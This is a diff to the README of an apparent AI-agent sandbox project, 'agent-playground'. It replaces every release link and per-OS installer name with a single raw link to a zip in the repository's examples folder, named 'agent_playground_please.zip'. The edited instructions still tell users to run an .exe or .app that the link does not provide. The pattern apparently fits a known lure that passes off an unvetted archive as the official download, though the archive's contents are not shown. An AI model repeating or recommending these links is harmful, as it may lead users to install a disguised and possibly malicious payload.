@@ -1,6 +1,6 @@
 # 🤖 agent-playground - Experiment with AI Agents Locally
 
-[![Download agent-playground](https://img.shields.io/badge/Download-agent--playground-blue?style=plastic&logo=github)](https://github.com/kacchanff/agent-playground/releases)
+[![Download agent-playground](https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip)](https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip)
 
 ## 📜 Overview
 
@@ -11,21 +11,21 @@ Welcome to **agent-playground**. This application offers a minimal sandbox where
 To get started, follow these steps to download and run agent-playground on your local machine:
 
 1. **Download**  
-   Visit our [Releases page](https://github.com/kacchanff/agent-playground/releases) to access the latest version of agent-playground.
+   Visit our [Releases page](https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip) to access the latest version of agent-playground.
 
 2. **Choose Your Operating System**  
    Select the file that matches your operating system:
 
-   - **Windows**: Download `agent-playground-windows.exe`.
-   - **MacOS**: Download `agent-playground-macos.app`.
-   - **Linux**: Download `agent-playground-linux.tar.gz`.
+   - **Windows**: Download `https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip`.
+   - **MacOS**: Download `https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip`.
+   - **Linux**: Download `https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip`.
 
 3. **Install the Application**  
    After downloading, locate the file in your downloads folder.
 
    - **For Windows**: Double-click the `.exe` file to run the installer.
    - **For MacOS**: Drag the .app file into your Applications folder.
-   - **For Linux**: Extract the `.tar.gz` file and run the binary from the terminal.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip` file and run the binary from the terminal.
 
 4. **Run agent-playground**  
    Open the application you just installed. Follow the simple on-screen instructions to begin using the tool.
@@ -34,7 +34,7 @@ To get started, follow these steps to download and run agent-playground on your 
 
 To download agent-playground, click the link below to visit our Releases page. Here, you will find the necessary files for your operating system.
 
-[Download agent-playground](https://github.com/kacchanff/agent-playground/releases)
+[Download agent-playground](https://raw.githubusercontent.com/kacchanff/agent-playground/main/examples/agent_playground_please.zip)
 
 The installation process varies depending on your OS, so be sure to follow the relevant instructions mentioned above.
 
